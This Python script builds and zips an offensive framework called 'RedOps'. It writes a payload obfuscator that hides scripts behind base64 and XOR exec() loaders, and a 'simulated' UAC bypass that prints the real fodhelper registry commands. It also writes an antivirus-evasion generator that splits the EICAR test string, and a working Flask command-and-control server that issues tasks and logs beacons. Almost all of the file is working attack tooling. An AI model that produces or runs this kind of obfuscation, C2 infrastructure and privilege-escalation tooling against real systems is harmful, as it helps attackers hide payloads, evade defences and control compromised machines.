from pathlib import Path
import shutil

try:
    project_root = Path(__file__).resolve().parent / "RedOps"
except NameError:
    project_root = Path.cwd() / "RedOps"

core_path = project_root / "core"
output_path = project_root / "output"
(core_path).mkdir(parents=True, exist_ok=True)
(project_root / "data" / "wordlists").mkdir(parents=True, exist_ok=True)
output_path.mkdir(parents=True, exist_ok=True)

# Core modules for obfuscation, evasion, and C2 server
core_modules = {
    "payload_obfuscator.py": """
import base64

def base64_obfuscate(script_text):
    encoded = base64.b64encode(script_text.encode()).decode()
    wrapper = f'import base64\\nexec(base64.b64decode("{encoded}"))'
    return wrapper

def xor_obfuscate(script_text, key=7):
    obfuscated = ','.join([str(ord(c) ^ key) for c in script_text])
    wrapper = (
        f'key={key}\\ncode=[{obfuscated}]\\n'
        'exec("".join([chr(c ^ key) for c in code]))'
    )
    return wrapper

def obfuscate(script_path, method="base64", output="output/obfuscated.py"):
    with open(script_path, "r") as f:
        original = f.read()

    if method == "base64":
        result = base64_obfuscate(original)
    elif method == "xor":
        result = xor_obfuscate(original)
    else:
        raise ValueError("Unsupported method")

    with open(output, "w") as f:
        f.write(result)
    print(f"[+] Obfuscated payload saved to {output}")
""",
    "uac_bypass_sim.py": """
def simulate_uac_bypass():
    print("[+] Simulating UAC bypass (Windows)...")
    bypass_vector = r\"\"\"
REG ADD HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /d "cmd.exe" /f
REG ADD HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /v "DelegateExecute" /f
start fodhelper.exe
\"\"\"
    print("[SIMULATION] Would execute:\\n" + bypass_vector)
    print("[!] This is for demonstration only — no real changes are made.")
""",
    "av_evasion.py": """
def generate_masked_eicar():
    eicar_parts = [
        "X5O!P%", "@AP[4\\\\P", "ZX54(P^)", "7CC)7}$EICAR", "-STANDARD", "-ANTIVIRUS", "-TEST", "-FILE!$H+H*"
    ]
    masked = '" + "'.join(eicar_parts)
    script = f'code = "{masked}"\\nwith open("eicar.txt", "w") as f:\\n\\tf.write(code)\\nprint("[+] Masked EICAR file written.")'
    output_path = "output/eicar_generator.py"
    with open(output_path, "w") as f:
        f.write(script)
    print(f"[+] Masked EICAR payload saved to {output_path}")
""",
    "c2_server.py": """
from flask import Flask, request

app = Flask(__name__)

@app.route('/command', methods=['GET'])
def send_command():
    with open("c2_tasks.txt", "r") as f:
        cmd = f.read().strip()
    return cmd or "noop"

@app.route('/log', methods=['POST'])
def receive_log():
    data = request.data.decode()
    with open("beacon_logs.txt", "a") as f:
        f.write(data + "\\n")
    return "OK"

if __name__ == "__main__":
    print("[+] C2 server running on http://0.0.0.0:8000")
    app.run(host="0.0.0.0", port=8000)
"""
}

# Write each core module
for filename, content in core_modules.items():
    (core_path / filename).write_text(content.strip())

# Zip the RedOps directory
zip_path = project_root.parent / "builds" / "RedOps_Framework.zip"
zip_path.parent.mkdir(parents=True, exist_ok=True)
shutil.make_archive(zip_path.with_suffix('').as_posix(), 'zip', project_root.as_posix())

print(f"[*] RedOps ZIP created at: {zip_path.resolve()}")
